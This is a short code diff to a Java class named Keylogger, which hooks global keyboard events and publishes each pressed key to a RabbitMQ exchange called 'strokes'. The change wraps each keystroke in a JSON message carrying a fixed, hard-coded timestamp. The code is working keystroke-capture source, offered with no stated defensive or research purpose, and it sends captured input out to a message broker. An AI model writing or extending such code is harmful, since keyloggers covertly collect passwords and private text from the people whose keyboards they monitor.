@@ -9,8 +9,8 @@ import com.rabbitmq.client.Connection;
 import com.rabbitmq.client.ConnectionFactory;
 
 public class Keylogger implements NativeKeyListener{
-  private Channel channel; 
   private final String EXCHANGE_NAME = "strokes";
+  private Channel channel; 
 
   public Keylogger() throws Exception{
     ConnectionFactory factory = new ConnectionFactory();
@@ -24,7 +24,8 @@ public class Keylogger implements NativeKeyListener{
   public void nativeKeyPressed(NativeKeyEvent nativeEvent){
     try {
       String key = NativeKeyEvent.getKeyText(nativeEvent.getKeyCode());
-      channel.basicPublish(EXCHANGE_NAME, "", null, key.getBytes("UTF-8"));
+      String payload = String.format("{\"pressedKey\": \"%s\", \"ts\": \"2023-11-24T12:30:45Z\"}", key);
+      channel.basicPublish(EXCHANGE_NAME,"",null,payload.getBytes());
     } catch (IOException e) {
       System.err.println(e);
       // log this maybe
